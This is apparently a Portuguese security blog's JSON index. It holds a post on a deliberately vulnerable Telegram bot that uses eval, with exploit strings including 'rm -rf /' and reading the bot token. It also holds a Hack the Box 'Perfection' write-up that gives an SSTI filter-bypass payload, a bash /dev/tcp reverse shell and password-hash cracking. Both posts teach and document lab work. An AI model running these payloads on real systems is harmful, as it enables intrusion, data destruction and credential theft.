[{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/appsec/","section":"Tags","summary":"","title":"Appsec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/appsec/","section":"Categories","summary":"","title":"AppSec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/guisso/","section":"Authors","summary":"","title":"Guisso"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/injection/","section":"Categories","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/owasp/","section":"Tags","summary":"","title":"Owasp"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/owasp/","section":"Categories","summary":"","title":"OWASP"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/pt-br/","section":"Tags","summary":"","title":"Pt-Br"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/python/","section":"Categories","summary":"","title":"Python"},{"content":" Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot. O bot inclui uma vulnerabilidade na função echo, que avalia qualquer entrada de texto recebida, potencialmente levando a ataques de injeção de código.\nExecutando o Projeto # Siga estas etapas para executar o projeto localmente:\nClone o repositório:\ngit clone https://github.com/fguisso/python-injection Instale as dependências necessárias:\npip install python-telegram-bot Obtenha um Token de Bot do Telegram:\nInicie uma conversa com BotFather no Telegram. Você pode encontrá-lo pesquisando por \u0026ldquo;@BotFather\u0026rdquo; na barra de pesquisa do Telegram ou clicando aqui. Envie o comando /newbot para iniciar o processo de criação de um novo bot. Siga as instruções para escolher um nome e um username para o seu bot. Após criar o bot, o BotFather irá fornecer um token. Copie esse token. Defina o Token do Bot como uma Variável de Ambiente:\nexport TOKEN_TELEGRAM=\u0026#34;seu_token_do_bot_aqui\u0026#34; Execute o script Python:\npython main.py Interaja com o bot no Telegram.\nFuncionamento do Bot # O bot está configurado para receber mensagens contendo operações matemáticas como entrada. Essas operações são resolvidas no comando echo, que retorna o resultado da operação como resposta.\nPor exemplo, ao enviar a mensagem 2 + 2 para o bot, ele retornará 4. Isso pode ser útil para realizar cálculos simples diretamente no Telegram.\nExplicação da vulnerabilidade # As vulnerabilidades de injeção estão entre as principais preocupações de segurança de aplicativos da web. De acordo com o OWASP Top 10, a injeção de código (como SQL injection, XSS, Command Injection e outras) é uma das principais ameaças para a segurança dos aplicativos.\nNo contexto deste bot, a vulnerabilidade de injeção ocorre na função echo, que utiliza a função eval para evoluir qualquer entrada de texto recebida. Isso permite que possíveis atacantes executem código arbitrário enviando uma entrada maliciosa. Exploits são os códigos maliciosos usados para atacar o sistemas e neste cenario estes são alguns exemplos de exploits que você pode enviar para seu bot que serão executados na maquina onde o seu bot esta rodando:\nMensagem para o bot Resultado do exploit os.getenv(\u0026quot;TOKEN_TELEGRAM\u0026quot;) Acesso a variáveis de ambiente os.system(\u0026quot;rm -rf /\u0026quot;) Execução de comandos do sistema operacional, no caso, rm vai deletar todos os arquivos do sistema. import malicious_module Importação de módulos maliciosos __import__(\u0026quot;malicious_module\u0026quot;).malicious_function() Execução de código malicioso. Os usuários são encorajados a testar esses exploits em seu próprio bot e observar os resultados. No entanto, tenha cuidado ao usar exploits, pois eles podem causar danos ao sistema.\nDocumentação # python-telegram-bot Documentation Telegram Bot API Documentation Telegram BotFather Documentation OWASP Top 10 ","date":"23 March 2024","externalUrl":null,"permalink":"/posts/python-injection/","section":"Posts","summary":"Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot.","title":"Python Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/","section":"Sunsec","summary":"","title":"Sunsec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/telegram/","section":"Categories","summary":"","title":"Telegram"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box"},{"content":" 1. Introdução # Coe, aqui estara a descrição dos passos que eu junto à galera da sunsec tomamos para resolver a máquina \u0026ldquo;Perfection\u0026rdquo; do hack the box. E que depois de muita luta (principalmente no bypass do SSTI) nós conseguimos ownar.\nReconhecimento # A princípio, utilizamos o nmap a fim de descobrir as portas sendo utilizadas e os serviços exploravei bem como suas versões\nnmap -sC -sV $target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx |_http-title: Weighted Grade Calculator Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Após analisar o resultado do nmap, nos voltamos para a aplicação web na porta 80. Na qual seguimos mapeando, foi utilizado o wapplizer extrair informações sobre as tecnologias sendo utilizadas na página web e descobrimos que estão utilizando ruby na versão 3.0.2. Além disso, o site foi construido usando o WEBrick 1.7.0. Com tudo que foi recolhido, buscamos por exploits para explorar as versões das tanto do ruby quanto do WEBbrick mas não encontramos nada.\nContinuamos vasculhando à aplicação até esbarrar no seguinte formulário:\n[ ]\nSeguindo o caminho esperado pela aplicação, nós inserimos os dados necessários no formulário e obtivemos como resultado um cálculo de peso.\nYour total grade is 12% sample: 12% N/A: 0% N/A: 0% N/A: 0% N/A: 0% Dado este output, nós percebemos que os dados que nós inserimos estão sendo processados pelo backend da aplicação e está sendo devolvido para o frontend. Com isso em mente, tentamos inserir alguns payloads de XSS/SQLI/SSTI e obtivemos a seguinte a menssagem \u0026ldquo;Malicious input blocked\u0026rdquo; então decidimos investir nesse campo. Focamos nos payloads de SSTI por se tratar de uma app escrita em ruby e esta linguagem ter um péssimo histórico com templates.\nApós batermos cabeça por muito tempo usando vários payloads com os mais diversos encodes possíveis, utilizamos uma técnica de bypass por meio da quebra de linha com o seguinte payload:\nunencoded aa\\n\u0026lt;%= `ls /` %\u0026gt; encoded aa%0a\u0026lt;%25%3d+`ls+/`+%25\u0026gt; Feito isso, agora é possível executar comandos dentro da máquina alvo. Sendo assim tentamos pegamos uma shell reversa alterando o comando para:\nunencoded aa\\n\u0026lt;%= `bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.73/1337 0\u0026gt;\u0026amp;1` %\u0026gt; encoded aa\\n\u0026lt;%25%3d+`bash+-i+\u0026gt;%26+/dev/tcp/10.10.14.73/1337+0\u0026gt;%261`+%25\u0026gt; Agora dentro da máquina alvo fazemos o update da shell\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Vasculhando por informações, encontra-se no diretorio do usuário \u0026ldquo;susan\u0026rdquo; um sub-diretorio de migrations, e utilizando o comando strings nele algumas informação.\nCredenciais da sunsan De posse dessa credencial nós quebrabos a senha com hashcat e a utilizamos para logar como root e pegar a última flag.\n","date":"22 March 2024","externalUrl":null,"permalink":"/posts/htb-perfection/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - Perfection"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/authors/paixao/","section":"Authors","summary":"","title":"Paixao"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]